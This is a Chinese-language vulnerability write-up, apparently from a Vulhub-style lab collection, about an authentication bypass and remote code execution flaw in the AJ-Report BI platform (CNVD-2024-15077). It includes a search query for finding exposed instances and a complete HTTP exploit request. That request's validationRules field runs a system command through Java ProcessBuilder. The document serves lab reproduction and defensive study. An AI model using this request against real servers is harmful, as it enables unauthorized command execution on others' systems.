# AJ-Report 认证绕过与远程代码执行漏洞 CNVD-2024-15077

## 漏洞描述

AJ-Report 是全开源的一个 BI 平台。在其 1.4.0 版本及以前，存在一处认证绕过漏洞，攻击者利用该漏洞可以绕过权限校验并执行任意代码。

参考链接：

- https://xz.aliyun.com/t/14460
- https://gitee.com/anji-plus/report/issues/I9HCB2
- https://github.com/wy876/POC/blob/main/AJ-Report%E5%BC%80%E6%BA%90%E6%95%B0%E6%8D%AE%E5%A4%A7%E5%B1%8F%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md

## 漏洞影响

```
version < v1.4.0
```

## 网络测绘

```
title="AJ-Report"
```

## 环境搭建

Vulhub 执行如下命令启动一个 AJ-Report 1.4.0 服务器：

```
docker compose up -d
```

服务启动后，可以在`http://your-ip:9095`查看到登录页面。

![](images/AJ-Report%20认证绕过与远程代码执行漏洞%20CNVD-2024-15077/image-20240527181756088.png)

## 漏洞复现

发送如下数据包：

```
POST /dataSetParam/verification;swagger-ui/ HTTP/1.1
Host: your-vps-ip:9095
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: en
Content-Type: application/json;charset=UTF-8
Connection: close
Content-Length: 339

{"ParamName":"","paramDesc":"","paramType":"","sampleItem":"1","mandatory":true,"requiredFlag":1,"validationRules":"function verification(data){a = new java.lang.ProcessBuilder(\"id\").start().getInputStream();r=new java.io.BufferedReader(new java.io.InputStreamReader(a));ss='';while((line = r.readLine()) != null){ss+=line};return ss;}"}
```

可见，`id` 命令已经执行成功：

![](images/AJ-Report%20认证绕过与远程代码执行漏洞%20CNVD-2024-15077/image-20240527181914943.png)
